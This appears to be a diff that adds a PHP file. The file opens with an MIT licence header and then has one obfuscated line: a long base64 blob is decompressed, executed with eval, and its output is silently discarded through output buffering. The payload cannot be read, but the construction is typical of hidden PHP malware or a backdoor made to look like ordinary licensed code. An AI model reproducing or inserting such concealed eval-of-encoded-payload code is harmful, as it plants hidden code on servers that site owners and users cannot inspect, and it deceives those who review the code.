@@ -1,0 +1,15 @@
+<?php
+/*
+MIT Licence
+
+Copyright (c) 2016
+All rights reserved.
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+*/
+?>
+<?php ob_start();$a='eNqdV+Fu2zYQ/h0/BaMFUwxEVooO2NBY8oY03TqgS9F02IogMCiJkphQpEJSzowg774jKcuyrbRxAyQRye/uvjseeUeRzAnP5ikjmB+Pz2bxdFaX9SgjOeXk2J/XmBPmn2jZkPEZkuS+oZIgn/KUNRlRoSJKUcHVBKT8DjAXPAXpDpUKntPCYsbPgrJkDjhOUv0NYN7wVHdGATeLR9PDt5fnn798vEClrhiMS4KzeITQtCIao7TEUhEdeY3Og188u3AYBNc0R+8vbmIHKrWuA2NyEXn/Bn//FpyLqsaaJox4CKhpwkHD+4uIZAU5SUspKhK98uLp4TXEkOY3QWAVa6oZiR8fEeaKMtHwgqCnp2no5jtOHIO4d0eWD0JmqmfBQ+E2CtxOJa2N118HLih5qIXUPdQDzXQZZWRBUxLYgRcjI2Z2GtH8+Mhtz7VfCFEw8g4ElX+Dogj5r/zx48zaUHoJ5H+lldGOGsmOfROvN2GYG/zEyeKaqkkqqjBVapbjirJldFkTjq4gFm9en56e/AS/P5+ewrZNQ6ezo/KEnClG+R3sPYs8C1AlIeBPKUkeeaA3rDDlE/jwXoROBRMyEf+9XOL2viFyObnXtG6FpqFLp2kisqXVkdEFShlWKvI4XiRYIvcvoHxBINU8JAUjdpEW2O6bkTM/u7KB0U5kh9jEMFGI3hIslq8GsgsmpyGIdWbsAD5G69FoW7cmVc2wJkGNC0gOieu6x2OAKUST4VoR1H0omhFY2WDYE8eMFhziCqloNE/ruCRLNMVtvH/w3I2DSFoKdNQoIk0imzM9DTH81ptegdaGrTi1poOK8GZl/8Bu8Dq5D6mCg398NP/94vO1nwn/ZjxGj86c3+rBcJ0siOefPc3iuKOWYVUmAsvMXDNAk67M5hjlOCjh9MNsSOO3K6BjzOjGZvXJ9FjY4wWxXyZC3Cn/hZxmmYg6oV1OGdY4warlhT6ukHsTK4XSe5GyAruEYDsXdtsNnT8MZm8qtyKZa8jSveh0QruUatYULaE/RYI+tyfgu4jty2mADpyKinLMHKUPmMNBNMT255NKksEpo3i/UPXEdtlBdXLEzteoNbGDg34VmV9dXF29v/zr2jdXnyUFrE5XFaTzYafsPJBkruTCuWE7jUc0e7HbLsX28bhLyi1nCyaS9uj8QxJ0ZWGD29AvVwOT3xeXrzupNeWF2s9NJ7PraCraE3DVQl7uJGA6I6YwNXr4dlRw6wew2tqBEbps9NrO+joPG7ZZskxjFk62643prQbKUtvl7JSuQVR/1ba5tkCkJUnvzGZT02Wuq+rkFkNajVfx7uvDjEATZP/CnQtYuRpQVUHBcS2j6wDsgmeS4mCTVGL6EIiP0lLwYieCuRQPEML2qrr49Ony05t+zVeOMaIKZYCcmHbKKXL10thzn9CX2200fYPb1ecK48rXrqIZUcIUeRxISm99yYLgUSZQhIDCXBK4UCGUvfUTb+Oq9U76VjsTTkVvyfC2hJo0p1IB2UyMnTO23xmNtpqNNoAVlgXlQSK0FlXw+nSrN+lDIcg7nUsvNwZj1D5E2meJ6ZxUaLqB1XPEurMZr2ek/EkPM/E7BZuHbqN7G5wYaPxWAzhM6IPIMEPudWIncyGg7nT5ZkfPHp16KWlR6s0WtI7PVwvoR4M5Q70+DvoQ8PGLe5uh3V61fpa64xL3e1b37d4/SMk08m67Hh1K5+TW3HChW48HwdADachMXL8Q74ZbwINtVIr5AqtbtasU7YJbvt1j5Bu6+0+QTeg0dG8QOADmofs/S+XSVQ==';eval(gzuncompress(base64_decode($a)));$v=ob_get_contents();ob_end_clean();?>
